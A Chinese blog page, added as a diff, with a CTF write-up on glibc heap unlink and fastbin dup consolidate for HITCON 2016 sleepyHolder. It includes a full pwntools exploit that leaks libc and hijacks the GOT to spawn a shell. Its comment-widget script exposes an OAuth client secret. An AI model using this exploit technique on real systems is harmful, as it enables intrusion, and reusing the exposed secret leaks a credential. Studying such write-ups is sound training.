@@ -1,0 +1,549 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Pandaos">
+  <meta name="keywords" content="">
+  
+  <title>Unlink 与 fastbin dup consolidate 利用 - Pandaos&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"panda0s.top","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Pandaos's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Panadaos</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/atom.xml">
+                <i class="iconfont icon-rss-fill"></i>
+                Rss
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Unlink 与 fastbin dup consolidate 利用">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-06-11 14:01" pubdate>
+        June 11, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      911 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      15
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Unlink 与 fastbin dup consolidate 利用</h1>
+            
+            <div class="markdown-body">
+              <h1 id="Unlink-与-fastbin-dup-consolidate-利用"><a href="#Unlink-与-fastbin-dup-consolidate-利用" class="headerlink" title="Unlink 与 fastbin dup consolidate 利用"></a>Unlink 与 fastbin dup consolidate 利用</h1><p>malloc 在分配 large chunk 的时候，会调用 <code>malloc_consolidate</code> 函数。</p>
+<p><code>malloc_consolidate</code> 函数将 fastbin 中的 chunk 与相邻 free chunk 合并，合并后放入 unsorted bin。</p>
+<p>若 chunk 的 next chunk 不是 free chunk，则清除 next chunk 的 size 的 INUSE 标志位。</p>
+<p>可以利用 malloc_consolidate 清理 next chunk size 标志位的性质构造 unlink</p>
+<p>unlink 最主要的思路就是想办法清除掉 INUSE 标志位，构造向后（低地址）unlink 的机会</p>
+<p>unlink fast bin dup consolidate 利用条件：</p>
+<ol>
+<li>存在多次释放漏洞</li>
+<li>可以分配 large chunk</li>
+</ol>
+<h2 id="sleepyHolder-hitcon-2016"><a href="#sleepyHolder-hitcon-2016" class="headerlink" title="sleepyHolder_hitcon_2016"></a>sleepyHolder_hitcon_2016</h2><p>这是一道简单的 unlink 题，只能创建三种类型固定大小的 chunk</p>
+<ol>
+<li>small secret: 40 字节 (fastbin)</li>
+<li>big secret:  4000 字节</li>
+<li>huge secret: 400000 字节</li>
+</ol>
+<p>其中 huge secret 只能在申请的时候改写，不能再次修改和释放，只能利用 huge secret 来触发 malloc_consolidate</p>
+<p>有三种操作:</p>
+<ol>
+<li>Wipe: 释放 small/big</li>
+<li>Renew: 修改 small/big secret</li>
+<li>Keep:申请 small/big/huge , (huge 只能申请一次)</li>
+</ol>
+<p>unlink 操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># unlink</span><br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\x11&#x27;</span> * <span class="hljs-number">0x28</span>) <span class="hljs-comment"># small secret</span><br>keep(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x22&#x27;</span> * <span class="hljs-number">0x28</span>) <span class="hljs-comment"># big secret</span><br><span class="hljs-comment"># 此时 small 与 big 对应的 chunk 相邻</span><br>wipe(<span class="hljs-number">1</span>) <span class="hljs-comment"># fastbin -&gt; small secret</span><br><br><span class="hljs-comment">#  big 对应的 chunk-&gt;size inuse 设置为 0</span><br><span class="hljs-comment">#  fastbin 被清空</span><br>keep(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;\x33&#x27;</span> * <span class="hljs-number">0x28</span>) <span class="hljs-comment"># malloc_consolidate</span><br><br><br><span class="hljs-comment"># 将 small bin 再次放入 fastbin</span><br>wipe(<span class="hljs-number">1</span>)  <span class="hljs-comment"># fastbin -&gt; small secret</span><br><br><span class="hljs-comment"># 申请 small secret 再次得到 small secret 控制权</span><br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;\x44&#x27;</span> * <span class="hljs-number">0x28</span>)<br><br><span class="hljs-comment"># 在 small 中构造 fake chunk</span><br>target = <span class="hljs-number">0x6020D0</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(target - <span class="hljs-number">0x18</span>) + p64(target - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x20</span>)<br>renew(<span class="hljs-number">1</span>, fake_chunk)<br><br><span class="hljs-comment"># 释放 big，由于 big 对应 chunk-&gt;prev_size INUSE 为 0，则 unlink</span><br>wipe(<span class="hljs-number">2</span>) <span class="hljs-comment"># unlink</span><br></code></pre></td></tr></table></figure>
+
+<p>unlink 操作后 target = 0x6020D0 (存 small 地址的变量) 的值被修改为 0x6020D0 - 0x18，调用 renew 可控如下所有地址区间</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020B8</span> <span class="hljs-selector-tag">qword_6020B8</span>    <span class="hljs-selector-tag">dq</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">sub_4008F0</span>↑<span class="hljs-selector-tag">r</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020B8</span>                                         ; <span class="hljs-selector-tag">sub_4008F0</span>+13↑<span class="hljs-selector-tag">w</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C0</span> ; <span class="hljs-selector-tag">void</span> *<span class="hljs-selector-tag">big_ptr</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C0</span> <span class="hljs-selector-tag">big_ptr</span>         <span class="hljs-selector-tag">dq</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span>+11<span class="hljs-selector-tag">E</span>↑<span class="hljs-selector-tag">w</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C0</span>                                         ; <span class="hljs-selector-tag">Keep</span>+139↑<span class="hljs-selector-tag">r</span> ...<br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C8</span> ; <span class="hljs-selector-tag">void</span> *<span class="hljs-selector-tag">huge_ptr</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C8</span> <span class="hljs-selector-tag">huge_ptr</span>        <span class="hljs-selector-tag">dq</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span>+174↑<span class="hljs-selector-tag">w</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020C8</span>                                         ; <span class="hljs-selector-tag">Keep</span>+18<span class="hljs-selector-tag">F</span>↑<span class="hljs-selector-tag">r</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020D0</span> ; <span class="hljs-selector-tag">void</span> *<span class="hljs-selector-tag">small_ptr</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020D0</span> <span class="hljs-selector-tag">small_ptr</span>       <span class="hljs-selector-tag">dq</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span>+<span class="hljs-selector-tag">C2</span>↑<span class="hljs-selector-tag">w</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020D0</span>                                         ; <span class="hljs-selector-tag">Keep</span>+<span class="hljs-selector-tag">DD</span>↑<span class="hljs-selector-tag">r</span> ...<br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020D8</span> <span class="hljs-selector-tag">big</span>             <span class="hljs-selector-tag">dd</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span><span class="hljs-selector-pseudo">:loc_400A3D</span>↑<span class="hljs-selector-tag">r</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020D8</span>                                         ; <span class="hljs-selector-tag">Keep</span>+125↑<span class="hljs-selector-tag">w</span> ...<br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020DC</span> <span class="hljs-selector-tag">huge</span>            <span class="hljs-selector-tag">dd</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span>+35↑<span class="hljs-selector-tag">r</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020DC</span>                                         ; <span class="hljs-selector-tag">Keep</span><span class="hljs-selector-pseudo">:loc_400A96</span>↑<span class="hljs-selector-tag">r</span> ...<br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020E0</span> <span class="hljs-selector-tag">small</span>           <span class="hljs-selector-tag">dd</span> ?                    ; <span class="hljs-selector-tag">DATA</span> <span class="hljs-selector-tag">XREF</span>: <span class="hljs-selector-tag">Keep</span><span class="hljs-selector-pseudo">:loc_4009E1</span>↑<span class="hljs-selector-tag">r</span><br><span class="hljs-selector-class">.bss</span><span class="hljs-selector-pseudo">:00000000006020E0</span>                                         ; <span class="hljs-selector-tag">Keep</span>+<span class="hljs-selector-tag">C9</span>↑<span class="hljs-selector-tag">w</span> ...<br></code></pre></td></tr></table></figure>
+
+<p>完整 exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> system<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-comment">#libc_file_name = &#x27;/home/pandaos/Projects/pwn/glibc/2.23/64/lib/libc-2.23.so&#x27;</span><br>libc_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/libc-2.23.so&#x27;</span><br>ld_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/ld-linux-x86-64.so.2&#x27;</span><br><span class="hljs-comment"># p = process([ld_file_name, &#x27;./sleepyHolder_hitcon_2016&#x27;],</span><br><span class="hljs-comment">#            env = &#123;&quot;LD_PRELOAD&quot;: libc_file_name&#125;)</span><br>p = remote(<span class="hljs-string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="hljs-number">25711</span>)<br>elf = ELF(<span class="hljs-string">&#x27;sleepyHolder_hitcon_2016&#x27;</span>)<br>libc = ELF(libc_file_name)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">keep</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>, content</span>):</span><br>    <span class="hljs-comment"># 1 small</span><br>    <span class="hljs-comment"># 2 Big</span><br>    <span class="hljs-comment"># 3 huge</span><br>    p.recvuntil(<span class="hljs-string">&#x27;3. Renew secret\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    time.sleep(<span class="hljs-number">0.5</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>))<br>    p.recvuntil(<span class="hljs-string">&#x27;Tell me your secret: \n&#x27;</span>)<br>    p.send(content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">renew</span>(<span class="hljs-params"><span class="hljs-built_in">type</span>, content</span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;3. Renew secret\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;Which Secret do you want to renew?\n&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>))<br>    p.recvuntil(<span class="hljs-string">&#x27;Tell me your secret: \n&#x27;</span>)<br>    p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wipe</span>(<span class="hljs-params"><span class="hljs-built_in">type</span></span>):</span><br>    p.recvuntil(<span class="hljs-string">&#x27;3. Renew secret\n&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;2. Big secret\n&#x27;</span>)<br>    p.send(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">type</span>))<br><br><br><br><span class="hljs-comment"># unlink</span><br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\x11&#x27;</span> * <span class="hljs-number">0x28</span>)<br>keep(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;\x22&#x27;</span> * <span class="hljs-number">0x28</span>)<br>wipe(<span class="hljs-number">1</span>)<br>keep(<span class="hljs-number">3</span>, <span class="hljs-string">b&#x27;\x33&#x27;</span> * <span class="hljs-number">0x28</span>) <span class="hljs-comment"># small presize clear</span><br>wipe(<span class="hljs-number">1</span>)<br>keep(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;\x44&#x27;</span> * <span class="hljs-number">0x28</span>)<br><br>target = <span class="hljs-number">0x6020D0</span><br>fake_chunk = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(target - <span class="hljs-number">0x18</span>) + p64(target - <span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x20</span>)<br>renew(<span class="hljs-number">1</span>, fake_chunk)<br>wipe(<span class="hljs-number">2</span>) <span class="hljs-comment"># unlink</span><br><br><span class="hljs-comment"># 0x6020D0-0x18 内存可写</span><br>                   <span class="hljs-comment"># big_ptr              # huge_ptr</span><br>payload = p64(<span class="hljs-number">0</span>) + p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(<span class="hljs-number">0x00000000006020b8</span>) + p64(<span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">2</span>, p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>payload = p64(<span class="hljs-number">0</span>) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(<span class="hljs-number">0x00000000006020b8</span>) + p64(<span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>renew(<span class="hljs-number">1</span>, payload)<br>wipe(<span class="hljs-number">2</span>)<br><br>leak_puts = u64(p.recvn(<span class="hljs-number">6</span>) + <span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>libc_base = leak_puts - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br><br>payload = p64(<span class="hljs-number">0</span>) + p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(bin_sh) + p64(<span class="hljs-number">1</span>) * <span class="hljs-number">3</span><br>renew(<span class="hljs-number">1</span>, payload)<br>renew(<span class="hljs-number">2</span>, p64(system))<br>wipe(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># input(&quot;&gt;&gt;&quot;)</span><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure>
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/PWN/">PWN</a>
+                    
+                      <a class="hover-with-bg" href="/tags/heap/">heap</a>
+                    
+                      <a class="hover-with-bg" href="/tags/fastbin/">fastbin</a>
+                    
+                      <a class="hover-with-bg" href="/tags/unlink/">unlink</a>
+                    
+                      <a class="hover-with-bg" href="/tags/fastbin-dup-consolidate/">fastbin_dup_consolidate</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">强网杯: unicorn_like_a_pro</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/06/11/unlink/">
+                        <span class="hidden-mobile">unlink</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/gitalk@1.7.0/dist/gitalk.min.js', function () {
+        var gitalk = new Gitalk({
+          clientID: '2e60164d74c132464b61',
+          clientSecret: '52a91b30d8b32af23cbb6d7c3ce8950d27240133',
+          repo: 'P4nda0s.github.io',
+          owner: 'P4nda0s',
+          admin: ["P4nda0s"],
+          id: '79032074de5e4b6364215645c61c7369',
+          language: 'zh-CN',
+          labels: ["Gitalk"],
+          perPage: 10,
+          pagerDirection: 'last',
+          createIssueManually: true,
+          distractionFreeMode: true,
+          proxy: 'https://purple-cell-2422.pandaos.workers.dev/?https://github.com/login/oauth/access_token'
+        });
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
